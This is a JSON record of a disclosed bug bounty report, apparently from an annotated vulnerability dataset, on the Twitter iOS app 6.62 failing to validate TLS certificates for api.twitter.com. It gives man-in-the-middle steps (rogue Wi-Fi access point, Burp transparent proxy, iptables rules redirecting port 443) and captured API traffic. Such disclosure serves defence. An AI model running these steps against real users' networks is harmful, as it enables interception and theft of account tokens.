{
    "reported_to": "X (Formerly Twitter)",
    "reported_by": "floyd ",
    "title": "Twitter iOS fails to validate server certificate and sends oauth token",
    "content": "\nTwitter on iOS newest two versions (6.62 and 6.62.1) are affected, other versions not tested. Tested independently on two different iPhone 6 with iOS version 9.3.3 and 9.3.5 without Jailbreak. The iPhone were without any mobileconfig profiles installed - no we did not install any CA certificate in the CA store of the device. Really stock iPhones. The Twitter app does not check the SSL/TLS certificate of https://api.twitter.com . A transparent proxy setup (eg. burp suite in transparent mode) is sufficient to exploit. Steps to reproduce:\nStart Burp or other Proxy software in transparent mode. Setting \"Generate CA-signed per-host certificates\", which means the CA cert of Burp is used, which is not trusted on the iPhones.\nStart rogue Wifi access point (eg. on the same machine as burp)\nRedirect all incoming HTTPS traffic on the rogue Wifi access point to the transparent proxy. We simply used on Linux: iptable -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to $BURP_IP:8080 iptable -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080\nConnect with the iOS device to the Wifi access point\nOpen Twitter app on iOS\nIn burp only the calls to api.twitter.com are visible and include sensitive authentication information etc.\nThis is the information we saw for two different accounts in burp which includes the oauth token etc.:\nGET /1.1/help/settings.json?include_zero_rate=true&settings_version=8910e1e75c037c3c6b59c64b477b0741 HTTP/1.1\nHost: api.twitter.com\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nX-Twitter-Client-Version: 6.62\nX-Twitter-Polling: true\nX-Client-UUID: D8AB1681-1618-48BA-9EB0-F3628DF1660B\nX-Twitter-Client-Language: de\nX-B3-TraceId: cc8ac1aea2ba5628\nx-spdy-bypass: 1\nAccept: /\nAccept-Language: de\nAccept-Encoding: gzip, deflate\nX-Twitter-Client-DeviceID: 68715C92-258F-4C59-A0B4-B98AF8B976BC\nUser-Agent: Twitter-iPhone/6.62 iOS/9.3.3 (Apple;iPhone8,1;;;;;1)\nConnection: close\nX-Twitter-API-Version: 5\nX-Twitter-Client-Limit-Ad-Tracking: 1\nX-Twitter-Client: Twitter-iPhone\nHTTP/1.1 304 Not Modified\ncache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0\nconnection: close\ncontent-length: 0\ncontent-security-policy: default-src 'self'; connect-src 'self'; font-src 'self' https://.twimg.com https://twitter.com https://ton.twitter.com data:; frame-src 'self' https://.twimg.com https://twitter.com https://ton.twitter.com; img-src 'self' https://.twimg.com https://twitter.com https://ton.twitter.com data:; media-src 'self' https://.twimg.com https://twitter.com https://ton.twitter.com; object-src 'none'; script-src 'self' https://.twimg.com https://twitter.com https://ton.twitter.com; style-src 'self' https://.twimg.com https://twitter.com https://ton.twitter.com; report-uri https://twitter.com/i/csp_report?a=NVQWGYLXFVRWY2LFNZ2C2Y3PNZTGSZY%3D&ro=false;\ncontent-type: text/html;charset=utf-8\ndate: Thu, 15 Sep 2016 08:33:18 GMT\nexpires: Tue, 31 Mar 1981 05:00:00 GMT\nlast-modified: Thu, 15 Sep 2016 08:33:18 GMT\npragma: no-cache\nserver: tsa_b\nset-cookie: guest_id=v1%3A147392839826657964; Domain=.twitter.com; Path=/; Expires=Sat, 15-Sep-2018 08:33:18 UTC\nstatus: 304 Not Modified\nstrict-transport-security: max-age=631138519\nx-access-level: read-write\nx-client-event-enabled: true\nx-connection-hash: 40e91f874332181942e1454b13ccaa6a\nx-content-type-options: nosniff\nx-frame-options: SAMEORIGIN\nx-rate-limit-limit: 15\nx-rate-limit-remaining: 12\nx-rate-limit-reset: 1473929244\nx-response-time: 29\nx-transaction: cc8ac1aea2ba5628\nx-twitter-response-tags: BouncerExempt\nx-twitter-response-tags: BouncerCompliant\nx-xss-protection: 1; mode=block\nGET /1.1/help/settings.json?include_zero_rate=true&settings_version=8910e1e75c037c3c6b59c64b477b0741 HTTP/1.1\nHost: api.twitter.com\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nX-Twitter-Client-Version: 6.62\nX-Twitter-Polling: true\nX-Client-UUID: D8AB1681-1618-48BA-9EB0-F3628DF1660B\nX-Twitter-Client-Language: de\nX-B3-TraceId: 796651628eef7eed\nx-spdy-bypass: 1\nAccept: /\nAccept-Language: de\nAccept-Encoding: gzip, deflate\nX-Twitter-Client-DeviceID: 68715C92-258F-4C59-A0B4-B98AF8B976BC\nUser-Agent: Twitter-iPhone/6.62 iOS/9.3.3 (Apple;iPhone8,1;;;;;1)\nConnection: close\nX-Twitter-API-Version: 5\nX-Twitter-Client-Limit-Ad-Tracking: 1\nX-Twitter-Client: Twitter-iPhone\nHTTP/1.1 304 Not Modified\ncache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0\nconnection: close\ncontent-length: 0\ncontent-security-policy: default-src 'self'; connect-src 'self'; font-src 'self' https://.twimg.com https://twitter.com https://ton.twitter.com data:; frame-src 'self' https://.twimg.com https://twitter.com https://ton.twitter.com; img-src 'self' https://.twimg.com https://twitter.com https://ton.twitter.com data:; media-src 'self' https://.twimg.com https://twitter.com https://ton.twitter.com; object-src 'none'; script-src 'self' https://.twimg.com https://twitter.com https://ton.twitter.com; style-src 'self' https://.twimg.com https://twitter.com https://ton.twitter.com; report-uri https://twitter.com/i/csp_report?a=NVQWGYLXFVRWY2LFNZ2C2Y3PNZTGSZY%3D&ro=false;\ncontent-type: text/html;charset=utf-8\ndate: Thu, 15 Sep 2016 08:34:36 GMT\nexpires: Tue, 31 Mar 1981 05:00:00 GMT\nlast-modified: Thu, 15 Sep 2016 08:34:36 GMT\npragma: no-cache\nserver: tsa_b\nset-cookie: guest_id=v1%3A147392847623972314; Domain=.twitter.com; Path=/; Expires=Sat, 15-Sep-2018 08:34:36 UTC\nstatus: 304 Not Modified\nstrict-transport-security: max-age=631138519\nx-access-level: read-write\nx-client-event-enabled: true\nx-connection-hash: e980abd0bd35e3bf0b8c693e8a12f636\nx-content-type-options: nosniff\nx-frame-options: SAMEORIGIN\nx-rate-limit-limit: 15\nx-rate-limit-remaining: 11\nx-rate-limit-reset: 1473929244\nx-response-time: 44\nx-transaction: 796651628eef7eed\nx-twitter-response-tags: BouncerExempt\nx-twitter-response-tags: BouncerCompliant\nx-xss-protection: 1; mode=block\n\n",
    "severity": [
        8.1,
        null
    ],
    "bounty": 2100,
    "weaknesses": [
        "Cryptographic Issues - Generic"
    ],
    "screenshots": {},
    "disclosed_date": 1482521640,
    "report_url": "https://hackerone.com/reports/168538",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "MOBILE",
    "steps": [
        [
            1,
            "Set up a transparent proxy (e.g., Burp Suite) in transparent mode with 'Generate CA-signed per-host certificates' enabled."
        ],
        [
            2,
            "Create a rogue WiFi access point and redirect all HTTPS traffic to the proxy using iptables rules."
        ],
        [
            3,
            "Connect an iOS device running Twitter app versions 6.62 or 6.62.1 to the rogue WiFi."
        ],
        [
            4,
            "Observe the intercepted traffic in Burp Suite, which includes sensitive OAuth tokens from api.twitter.com."
        ]
    ],
    "vuln_description": "The Twitter iOS app (versions 6.62 and 6.62.1) fails to validate SSL/TLS certificates for api.twitter.com, allowing a man-in-the-middle attacker to intercept sensitive authentication tokens via a transparent proxy.",
    "reason": "The attack requires setting up a proxy and rogue WiFi, but the core vulnerability (lack of certificate validation) is straightforward to exploit once the infrastructure is in place. The interaction between components is not subtle.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}